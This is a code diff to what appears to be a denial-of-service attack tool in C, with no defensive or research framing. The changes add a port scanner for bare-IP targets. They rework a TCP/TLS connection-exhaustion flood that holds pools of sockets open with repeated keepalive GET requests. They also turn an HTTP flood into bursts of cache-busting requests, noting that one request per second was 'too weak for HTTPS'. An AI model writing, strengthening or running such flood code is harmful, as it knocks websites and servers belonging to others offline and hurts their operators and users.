@@ -220,9 +220,47 @@ static void *udp_worker(void *arg) {
     return NULL;
 }
 
-/* MEGA — TCP Connection Flood: connect + optional TLS + hold connection.
- * Exhausts FDs/TCP stack. 25% target port, 75% random port. */
-#define MEGA_TCP_POOL 4096
+/* Port scan only for bare IP / VPS targets — not for website HTTPS (always :443). */
+#define PORT_SCAN_MAX 48
+static int looks_like_ip(const char *h)
+{
+    if (!h || !*h) return 0;
+    int dots = 0, digits = 0;
+    for (const char *p = h; *p; p++) {
+        if (*p == '.') dots++;
+        else if (*p >= '0' && *p <= '9') digits++;
+        else return 0;
+    }
+    return dots == 3 && digits >= 4;
+}
+static int scan_open_ports(const struct sockaddr_in *base, int user_port, int *out, int out_max)
+{
+    static const int common[] = {
+        21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995,
+        1433, 2083, 2087, 3000, 3306, 3389, 5432, 6379, 7777, 8000,
+        8080, 8443, 8888, 9000, 25565, 27017, 30120, 0
+    };
+    int n = 0;
+    if (user_port > 0 && user_port < 65536 && n < out_max)
+        out[n++] = user_port;
+    for (int i = 0; common[i] && n < out_max; i++) {
+        int p = common[i];
+        if (p == user_port) continue;
+        int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (s < 0) break;
+        struct sockaddr_in ta = *base;
+        ta.sin_port = htons((uint16_t)p);
+        if (tcp_connect_wait(s, &ta, 200) == 0) {
+            out[n++] = p;
+            close(s);
+        } else close(s);
+    }
+    if (n == 0 && user_port > 0) out[n++] = user_port;
+    return n;
+}
+
+/* MEGA / TLS: website HTTPS → port 443 only. IP/VPS → scan then focus open ports. */
+#define MEGA_TCP_POOL 2048
 static void *mega_tcp_worker(void *arg) {
     MegaThread *mt = (MegaThread *)arg;
     int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
@@ -231,12 +269,39 @@ static void *mega_tcp_worker(void *arg) {
 
     time_t start = time(NULL);
     int *socks = calloc(MEGA_TCP_POOL, sizeof(int));
-    if (!socks) return NULL;
+    SSL **ssls = calloc(MEGA_TCP_POOL, sizeof(SSL *));
+    time_t *last_ping = calloc(MEGA_TCP_POOL, sizeof(time_t));
+    if (!socks || !ssls || !last_ping) {
+        free(socks); free(ssls); free(last_ping); return NULL;
+    }
     SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
-    if (ctx) SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
+    if (!ctx) { free(socks); free(ssls); free(last_ping); return NULL; }
+    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
+    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
+    SSL_CTX_set_session_cache_mode(ctx, SSL_SESS_CACHE_CLIENT);
 
     struct sockaddr_in ta = mt->target;
+    int base_port = mt->port_base > 0 ? mt->port_base : 443;
+    int open_ports[PORT_SCAN_MAX];
+    int nports;
+
+    /* Domain/website (not pure IP): only target port — https://x.com = 443 */
+    if (!looks_like_ip(mt->host) || base_port == 443 || base_port == 80 || base_port == 8443) {
+        open_ports[0] = base_port;
+        nports = 1;
+        fprintf(stderr, "[atk] MEGA website mode → port %d only (no multi-scan)\n", base_port);
+    } else {
+        nports = scan_open_ports(&ta, base_port, open_ports, PORT_SCAN_MAX);
+        if (nports < 1) { open_ports[0] = base_port; nports = 1; }
+        char plist[256] = {0};
+        int off = 0;
+        for (int i = 0; i < nports && off < 240; i++)
+            off += snprintf(plist + off, sizeof(plist) - (size_t)off, "%s%d", i ? "," : "", open_ports[i]);
+        fprintf(stderr, "[atk] MEGA VPS mode open ports (%d): %s\n", nports, plist);
+    }
+
     int pool = 0;
+    int port_rr = 0;
 
     while (time(NULL) - start < mt->duration && !is_attack_stop()) {
         int us = should_throttle();
@@ -248,55 +313,103 @@ static void *mega_tcp_worker(void *arg) {
             int fl = 1;
             setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
             setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &fl, sizeof(fl));
+            struct timeval tv = {10, 0};
+            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+            setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 
-            uint16_t p = (rand() & 3) == 0
-                ? (uint16_t)mt->port_base
-                : (uint16_t)((rand() % 65535) + 1);
-            if (p == 0) p = 1;
-            ta.sin_port = htons(p);
+            int p = open_ports[port_rr % nports];
+            port_rr++;
+            ta.sin_port = htons((uint16_t)p);
 
-            if (tcp_connect_wait(s, &ta, 400) < 0) { close(s); continue; }
+            if (tcp_connect_wait(s, &ta, 1500) < 0) { close(s); continue; }
 
-            /* Try TLS — if succeeds, consumes extra target memory; if fails, raw TCP still holds */
-            if (ctx) {
-                SSL *ssl = SSL_new(ctx);
+            /* TLS on 443/8443 and TLS_EXHAUST tag; otherwise raw TCP hold */
+            int want_tls = (p == 443 || p == 8443 || p == 2083 || p == 2087 || mt->cpu_id == -4);
+            SSL *ssl = NULL;
+            if (want_tls) {
+                ssl = SSL_new(ctx);
                 if (ssl) {
                     SSL_set_fd(ssl, s);
-                    SSL_set_tlsext_host_name(ssl, mt->host);
-                    SSL_connect(ssl);
-                    SSL_free(ssl);
+                    if (mt->host[0]) SSL_set_tlsext_host_name(ssl, mt->host);
+                    if (SSL_connect(ssl) != 1) {
+                        SSL_free(ssl);
+                        ssl = NULL;
+                        if (p == 443 || p == 8443) {
+                            close(s);
+                            continue;
+                        }
+                    } else {
+                        char req[512];
+                        snprintf(req, sizeof(req),
+                            "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n"
+                            "Accept: */*\r\nConnection: keep-alive\r\n\r\n",
+                            mt->host[0] ? mt->host : "localhost");
+                        SSL_write(ssl, req, (int)strlen(req));
+                    }
                 }
+            } else {
+                char b = 0;
+                send(s, &b, 1, MSG_NOSIGNAL);
             }
 
-            { char b = 0; send(s, &b, 1, MSG_NOSIGNAL); }
-            socks[pool++] = s;
-            pkt_sent(64 + 512); /* TCP + TLS overhead */
+            socks[pool] = s;
+            ssls[pool] = ssl;
+            last_ping[pool] = time(NULL);
+            pool++;
+            pkt_sent(ssl ? 1024 : 64);
         }
 
-        /* Reap dead connections */
-        struct pollfd fds[MEGA_TCP_POOL];
-        int nfds = (pool < (int)(sizeof(fds)/sizeof(fds[0]))) ? pool : (int)(sizeof(fds)/sizeof(fds[0]));
-        for (int i = 0; i < nfds; i++) {
-            fds[i].fd = socks[i];
-            fds[i].events = POLLERR | POLLHUP;
-        }
-        if (poll(fds, nfds, 200) > 0) {
-            int w = 0;
-            for (int i = 0; i < pool; i++) {
-                if (i < nfds && (fds[i].revents & (POLLERR | POLLHUP)))
-                    close(socks[i]);
-                else {
-                    if (w != i) socks[w] = socks[i];
-                    w++;
+        /* Keepalive: re-send GET every 3s so TLS sessions stay live */
+        time_t now = time(NULL);
+        for (int i = 0; i < pool && !is_attack_stop(); i++) {
+            if (now - last_ping[i] < 3) continue;
+            if (ssls[i]) {
+                char req[256];
+                snprintf(req, sizeof(req),
+                    "GET /?t=%ld HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n",
+                    (long)now, mt->host[0] ? mt->host : "localhost");
+                if (SSL_write(ssls[i], req, (int)strlen(req)) <= 0) {
+                    SSL_free(ssls[i]); ssls[i] = NULL;
+                    close(socks[i]); socks[i] = -1;
+                } else {
+                    pkt_sent((int)strlen(req));
+                    last_ping[i] = now;
                 }
+            } else if (socks[i] >= 0) {
+                char b = 0;
+                if (send(socks[i], &b, 1, MSG_NOSIGNAL) <= 0) {
+                    close(socks[i]); socks[i] = -1;
+                } else last_ping[i] = now;
             }
-            pool = w;
         }
-        sched_yield();
+
+        /* Reap dead */
+        int w = 0;
+        for (int i = 0; i < pool; i++) {
+            if (socks[i] < 0) continue;
+            struct pollfd pfd = { .fd = socks[i], .events = POLLERR | POLLHUP };
+            if (poll(&pfd, 1, 0) > 0 && (pfd.revents & (POLLERR | POLLHUP))) {
+                if (ssls[i]) SSL_free(ssls[i]);
+                close(socks[i]);
+            } else {
+                if (w != i) {
+                    socks[w] = socks[i];
+                    ssls[w] = ssls[i];
+                    last_ping[w] = last_ping[i];
+                }
+                w++;
+            }
+        }
+        pool = w;
+        if (pool >= MEGA_TCP_POOL) usleep(50000);
+        else sched_yield();
     }
-    for (int i = 0; i < pool; i++) close(socks[i]);
-    if (ctx) SSL_CTX_free(ctx);
-    free(socks);
+    for (int i = 0; i < pool; i++) {
+        if (ssls[i]) SSL_free(ssls[i]);
+        if (socks[i] >= 0) close(socks[i]);
+    }
+    SSL_CTX_free(ctx);
+    free(socks); free(ssls); free(last_ping);
     return NULL;
 }
 
@@ -480,28 +593,33 @@ static void *http_worker(void *arg) {
             pool++;
         }
 
-        /* Send requests — 1 req/s per connection, keep-alive across requests */
-        time_t now = time(NULL);
+        /* Burst requests on each live connection (not 1/s — too weak for HTTPS) */
         for (int i = 0; i < pool && !is_attack_stop(); i++) {
-            if (now - last_req[i] < 1) continue;
-            char req[4096];
-            const char *ua = uas[rand_r(&seed) % 5];
-            const char *path = paths[rand_r(&seed) % 12];
-            snprintf(req, sizeof(req),
-                "GET %s HTTP/1.1\r\nHost: %s\r\n"
-                "User-Agent: %s\r\n"
-                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-                "Accept-Language: en-US,en;q=0.5\r\n"
-                "Accept-Encoding: gzip, deflate, br\r\n"
-                "Cache-Control: no-cache\r\n"
-                "Connection: keep-alive\r\n\r\n",
-                path, mt->host, ua);
-            if (ssls[i])
-                SSL_write(ssls[i], req, (int)strlen(req));
-            else
-                send(socks[i], req, strlen(req), MSG_NOSIGNAL);
-            last_req[i] = now;
-            pkt_sent((int)strlen(req));
+            for (int burst = 0; burst < 8 && !is_attack_stop(); burst++) {
+                char req[4096];
+                const char *ua = uas[rand_r(&seed) % 5];
+                const char *path = paths[rand_r(&seed) % 12];
+                const char *host = mt->host[0] ? mt->host : "localhost";
+                snprintf(req, sizeof(req),
+                    "GET %s?r=%u HTTP/1.1\r\nHost: %s\r\n"
+                    "User-Agent: %s\r\n"
+                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                    "Accept-Language: en-US,en;q=0.5\r\n"
+                    "Cache-Control: no-cache\r\n"
+                    "Connection: keep-alive\r\n\r\n",
+                    path, rand_r(&seed), host, ua);
+                int wr;
+                if (ssls[i])
+                    wr = SSL_write(ssls[i], req, (int)strlen(req));
+                else
+                    wr = (int)send(socks[i], req, strlen(req), MSG_NOSIGNAL);
+                if (wr <= 0) {
+                    if (ssls[i]) { SSL_free(ssls[i]); ssls[i] = NULL; }
+                    close(socks[i]); socks[i] = -1;
+                    break;
+                }
+                pkt_sent(wr);
+            }
         }
 
         /* Reap dead connections */
